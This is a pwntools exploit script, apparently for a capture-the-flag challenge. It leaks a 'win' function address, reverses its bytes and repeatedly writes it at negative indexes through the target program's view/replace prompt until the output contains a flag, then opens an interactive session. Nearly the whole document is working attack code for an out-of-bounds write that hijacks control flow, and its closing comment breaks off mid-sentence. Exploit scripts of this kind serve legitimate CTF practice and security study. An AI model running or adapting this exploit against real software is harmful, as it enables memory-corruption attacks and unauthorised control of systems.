from pwn import *
from grwnapy.pwn import find_offset


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

if args.REMOTE:
    exe = "/home/grwcha/grwna/.example_elf"
else:
    exe = sys.argv[1]
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                           EXPLOIT
# ===========================================================

flag = b""
offset = 1
while True:
    try:
        io = start()
        io.recvuntil(b"win is located at: 0x")
        win = io.recvuntil("\n")[:-1]
        print(win)
        win = b''.join([win[i:i+2] for i in range(0, len(win), 2)][::-1])
        print(win)
        io.sendlineafter(b'like to view?', b"-" + str(offset).encode())
        io.sendafter(b'replace it with? ', win)
        offset += 1
        data = io.recvall()
        if b"flag" in data:
            io.interactive()
    except EOFError:
        exit()


"""
You can overwrite addresses based
"""